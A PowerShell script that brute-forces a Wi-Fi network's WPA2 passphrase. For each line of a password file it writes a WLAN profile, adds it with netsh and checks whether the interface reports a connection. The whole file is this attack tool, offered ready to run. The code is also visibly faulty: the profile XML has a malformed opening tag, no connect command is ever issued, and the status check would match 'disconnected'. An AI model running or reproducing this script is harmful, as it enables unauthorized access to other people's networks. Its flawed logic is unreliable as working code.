param (
    [string]$ssid,
    [string]$passwordFile
)

function Connect-ToWifi {
    param (
        [string]$ssid,
        [string]$passwordFile
    )

    $passwords = Get-Content $passwordFile

    foreach ($password in $passwords) {
        Write-Host "Testing password: $password"
        $cmd = "netsh wlan add profile filename=`"$ssid.xml`""
        $xml = @"
< WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$ssid</name>
    <SSIDConfig>
        <SSID>
            <name>$ssid</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <security>
        <keyManagement>wpa2psk</keyManagement>
        <sharedKey>
            <keyType>passPhrase</keyType>
            <key>$password</key>
        </sharedKey>
    </security>
</WLANProfile>
"@
        $xml | Out-File -FilePath "$ssid.xml" -Encoding utf8
        Invoke-Expression $cmd
        Start-Sleep -Seconds 5

        $status = netsh wlan show interfaces | Select-String "State" | ForEach-Object { $_.ToString().Trim() }
        if ($status -like "*connected*") {
            Write-Host "Connected to the network $ssid with the password $password"
            return $true
        } else {
            Write-Host "The password $password is not valid"
        }
    }

    Write-Host "None of the passwords provided are valid"
    return $false
}

if ($ssid -and $passwordFile) {
    if (Connect-ToWifi -ssid $ssid -passwordFile $passwordFile) {
        Write-Host "Connection successful!"
    } else {
        Write-Host "Could not connect"
    }
} else {
    Write-Host "Usage: .\script.ps1 -ssid <SSID> -passwordFile <password_file>"
}